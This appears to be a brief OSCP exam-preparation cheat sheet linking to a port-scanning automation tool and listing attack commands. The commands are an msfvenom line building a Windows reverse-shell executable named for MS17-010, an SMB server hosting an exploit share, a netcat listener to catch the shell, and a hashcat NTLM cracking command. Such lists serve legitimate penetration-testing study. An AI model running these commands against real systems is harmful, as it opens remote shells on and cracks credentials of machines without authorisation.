# Offensive Security Certified Professional
## OSCP Tools and Resources for Your Journey


##### Nmap Automator. Save time on port/vuln scans:
https://github.com/21y4d/nmapAutomator




Category | Command Examples
------------ | -------------
MSFVENOM | msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.221 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe
SMB | python3 smbserver.py lab "~/OSCP/EXPLOITS/MS17-010/CLISHARE"
NETCAT | nc -nvlp 443   *(Creates a local listener)*
CRACKING | hashcat -m 1000 -a 0 --force --show --username hash.txt wordlist1.lst 
